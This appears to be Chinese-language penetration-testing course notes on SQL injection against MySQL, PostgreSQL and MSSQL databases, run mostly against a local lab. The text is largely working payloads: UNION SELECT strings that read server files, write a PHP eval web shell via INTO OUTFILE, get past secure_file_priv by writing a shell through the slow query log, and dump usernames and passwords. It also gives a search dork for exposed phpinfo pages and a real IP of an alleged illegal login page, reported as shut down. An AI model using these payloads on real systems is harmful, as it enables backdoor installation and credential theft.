![img](https://cdn.nlark.com/yuque/0/2024/png/1591503/1721135155234-a10137eb-d94c-4baf-9736-275521783366.png)

```plain
#知识点：
1、SQL注入-MYSQL数据库
2、SQL注入-MSSQL数据库
3、SQL注入-PostgreSQL数据库

#详细点：
Access无高权限注入点-只能猜解，还是暴力猜解
MYSQL，PostgreSQL，MSSQL高权限注入点-可升级读写执行等，还需要看具体有没有限制，能不能进行执行等等。
```

- MYSQL-root高权限读写注入

```plain
决定：连接的数据库用户
-读取文件：
UNION SELECT 1,load_file('d:/w.txt'),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17
```

![img](https://cdn.nlark.com/yuque/0/2024/png/1591503/1721135154764-ec50bc75-5062-4e2a-a60b-6150d15aa730.png)

数据库中正常读取文件：select load_file('d:/www.txt');

![img](https://cdn.nlark.com/yuque/0/2024/png/1591503/1721135154467-3f60ee13-cfde-46b1-86ef-65964d1eecde.png)

```plain
-写入文件：
UNION SELECT 1,'xxxx',3,4,5,6,7,8,9,10,11,12,13,14,15,16,17 into outfile 'd:/www.txt'
数据库写文件：select 'xxx' into outfile 'd:/1.txt';
```

![img](https://cdn.nlark.com/yuque/0/2024/png/1591503/1721135154468-a1eb2850-1c34-4277-9e4c-a8640c1753fd.png)

```plain
-路径获取：phpinfo,报错,字典等
https://blog.csdn.net/god_7z1/article/details/8725541
读取关键文件，可以在搜索关键函数等
读取关键配置文件：http://127.0.0.1:8081/web/mysql/news.php?id=1 UNION SELECT 1,load_file('D:\\phpstudy_pro\\WWW\\web\\mysql\\config\\conn.php'),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17
```

![img](https://cdn.nlark.com/yuque/0/2024/png/1591503/1721135154465-2fd1413e-8d5c-40a7-91ed-0bfdcf54ace7.png)

Phpinfo :搜索语法：inurl:phpinfo

![img](https://cdn.nlark.com/yuque/0/2024/png/1591503/1721135154910-299c4cf5-57c3-4799-a148-417fc27c4c72.png)

```plain
后门代码：
http://127.0.0.1:8081/web/mysql/news.php
?id=1 UNION SELECT 1,'<?php eval($_POST['x']);?>',3,4,5,6,7,8,9,10,11,12,13,14,15,16,17 into outfile 'D:\\phpstudy_pro\\WWW\\web\\mysql\\3.php'
```

![img](https://cdn.nlark.com/yuque/0/2024/png/1591503/1721135154921-4c8b2a35-84ee-4a3c-958b-0a7dac4d6ec0.png)

```plain
-无法写入：secure_file_priv突破 v突破 注入中需要支持SQL执行环境，没有就需要借助
secure_file_priv会限制读写，如果有限制，则意味着只能在该盘符上进行操作。
phpmyadmin或能够直接连上对方数据库进行绕过，或者支持堆叠注入。
set global slow_query_log=1;
set global slow_query_log_file='shell路径';
select '<?php eval($_POST[A]);?>' or SLEEP(11);
访问shell路径，连接后门。
```

![img](https://cdn.nlark.com/yuque/0/2024/png/1591503/1721135155002-5e6ce0d8-ee41-4081-a82e-a96416e967f4.png)

- PostgreSQL-高权限读写注入

```plain
-测列数：
order by 4
and 1=2 union select null,null,null,null
-测显位：第2，3
and 1=2 union select 'null',null,null,null 错误
and 1=2 union select null,'null',null,null 正常
and 1=2 union select null,null,'null',null 正常
and 1=2 union select null,null,null,'null' 错误
```

![img](https://cdn.nlark.com/yuque/0/2024/png/1591503/1721135155031-4776be1d-d006-4003-94a4-e4d8c264a5ba.png)

```plain
-获取信息：
and 1=2 UNION SELECT null,version(),null,null
and 1=2 UNION SELECT null,current_user,null,null
```

![img](https://cdn.nlark.com/yuque/0/2024/png/1591503/1721135155204-f42f9778-6343-4591-962f-98aacbd3f8f6.png)

and 1=2 union select null,current_database(),null,null

![img](https://cdn.nlark.com/yuque/0/2024/png/1591503/1721135155281-eb906fe2-7326-4613-b3b8-6020082bea15.png)

```plain
-获取数据库名：
and 1=2 union select null,string_agg(datname,','),null,null from pg_database
```

![img](https://cdn.nlark.com/yuque/0/2024/png/1591503/1721135155286-815f0215-91e2-411a-a738-17d624baa467.png)

```plain
-获取表名：
1、and 1=2 union select null,string_agg(tablename,','),null,null from pg_tables where schemaname='public'
2、and 1=2 union select null,string_agg(relname,','),null,null from pg_stat_user_tables
```

![img](https://cdn.nlark.com/yuque/0/2024/png/1591503/1721135155301-a08cb00d-634d-40d7-a481-6262063c27f6.png)

```plain
-获取列名：
and 1=2 union select null,string_agg(column_name,','),null,null from information_schema.columns where table_name='reg_users'
```

![img](https://cdn.nlark.com/yuque/0/2024/png/1591503/1721135155516-c89b2c42-43f8-47d7-ae17-60dc9eda395b.png)

```plain
-获取数据：
and 1=2 union select null,string_agg(name,','),string_agg(password,','),null from reg_users
```

![img](https://cdn.nlark.com/yuque/0/2024/png/1591503/1721135155634-c2555274-6030-4068-9d98-cfe5f8d34e10.png)

```plain
参考：https://www.freebuf.com/sectool/249371.html
-补充-获取dba用户（同样在DBA用户下，是可以进行文件读写的）：
and 1=2 union select null,string_agg(usename,','),null,null FROM pg_user WHERE usesuper IS TRUE
```

![img](https://cdn.nlark.com/yuque/0/2024/png/1591503/1721135155768-bf95e86d-cfe1-4b3a-9262-5a548fa4ded3.png)

- MSSQL-sa高权限读写执行注入

```plain
-测列数：
order by 4
and 1=2 union all select null,null,null,null
-测显位：
and 1=2 union all select null,1,null,null
and 1=2 union all select null,null,'s',null
```

![img](https://cdn.nlark.com/yuque/0/2024/png/1591503/1721135155658-4c84b378-5653-4d0a-8b21-f817e50b069b.png)

```plain
-获取信息：
@@version 获取版本信息
```

![img](https://cdn.nlark.com/yuque/0/2024/png/1591503/1721135155717-8937a115-a979-4cda-b45e-d4d24183a3ca.png)

```plain
db_name() 当前数据库名字
user、system_user,current_user,user_name 获取当前用户名
```

![img](https://cdn.nlark.com/yuque/0/2024/png/1591503/1721135155805-1fe29753-012f-451b-8f99-00af402f1e67.png)

@@SERVERNAME 获取服务器主机信息

![img](https://cdn.nlark.com/yuque/0/2024/png/1591503/1721135155893-81def829-a52e-4826-90b0-438421b78792.png)

```plain
and 1=2 union all select null,db_name(),null,null
-获取表名：
and 1=2 union all select null,(select top 1 name from mozhe_db_v2.dbo.sysobjects where xtype='u'),null,null
union all select null,(select top 1 name from mozhe_db_v2.dbo.sysobjects where xtype='u' and name not in ('manage')),null,null
```

![img](https://cdn.nlark.com/yuque/0/2024/png/1591503/1721135156039-a07e7357-8c1e-495d-bda7-3bde6f9cd3cd.png)

```plain
-获取列名：
and 1=2 union all select null,(select top 1 col_name(object_id('manage'),1) from sysobjects),null,null
and 1=2 union all select null,(select top 1 col_name(object_id('manage'),2) from sysobjects),null,null
and 1=2 union all select null,(select top 1 col_name(object_id('manage'),3) from sysobjects),null,null
and 1=2 union all select null,(select top 1 col_name(object_id('manage'),4) from sysobjects),null,null
```

![img](https://cdn.nlark.com/yuque/0/2024/png/1591503/1721135156037-874713dc-1b56-4a71-9c42-26d7f7d7336f.png)

```plain
• -获取数据：
and 1=2 union all select null,username, password ,null from manage
```

- 结尾彩蛋-某Q牌违法登陆框注入

```plain
116.206.94.133:888
已经关闭。
```